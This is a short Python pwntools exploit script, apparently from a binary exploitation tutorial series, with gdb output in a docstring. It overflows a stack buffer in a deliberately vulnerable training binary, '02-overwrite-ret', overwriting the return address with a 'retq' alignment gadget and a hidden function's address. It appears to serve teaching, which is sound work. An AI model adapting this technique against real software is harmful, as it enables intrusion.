#!/usr/bin/python

"""
(gdb) b *(&vulnerable)
Breakpoint 1 at 0x400662: file src/02-overwrite-ret.c, line 10.
(gdb) c
Continuing.
Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...
Reading /lib/x86_64-linux-gnu/libc-2.27.so from remote target...
Reading /lib/x86_64-linux-gnu/.debug/libc-2.27.so from remote target...

Breakpoint 1, vulnerable () at src/02-overwrite-ret.c:10
10	int vulnerable() {
(gdb) i r $rsp
rsp            0x7ffcdbdc39d8	0x7ffcdbdc39d8
(gdb) p &buffer[0]
$1 = 0x7ffcdbdc3950 "\377\377\377\377"
"""

import struct
import sys

from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = './bin/x86-64/02-overwrite-ret'

vulnerable_ret_addr = 0x7ffcdbdc39d8
buffer_addr = 0x7ffcdbdc3950

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']

retq_asm = asm('retq')
retq_addr = binary.search(retq_asm).next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p64(retq_addr) # align stack
payload += p64(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
